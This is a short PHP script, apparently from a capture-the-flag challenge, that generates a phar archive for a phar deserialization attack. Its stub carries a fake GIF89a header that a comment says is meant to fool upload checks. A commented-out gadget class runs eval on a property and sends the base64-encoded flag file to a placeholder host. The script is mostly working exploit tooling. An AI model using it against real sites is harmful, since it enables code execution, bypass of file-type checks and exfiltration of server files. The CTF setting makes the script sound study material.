<?php
//把要进行反序列化的对象放在此处

class FlagController {
	public function __construct() {
		return $this->showFlag();
	}

	public function showFlag() {
		// $flag = file_get_contents('/th1s1s_F14g_2333333');
		// return view('auth.flag')->with('flag', $flag);
		return 1;
	}
}

class Test {

}
// class foo
// {
//     var $ha = 'phpinfo();';
//     function __destruct()
//     {
//         eval($this->ha);
//         file_get_contents("http://ippppppppp/?f=".base64_encode(file_get_contents('/th1s1s_F14g_2333333')));
//     }
// }
//生成对应可被利用的对象
// $o = new FlagController();
$o = new Test();
@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头用以欺骗检测
$phar->setMetadata($o); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>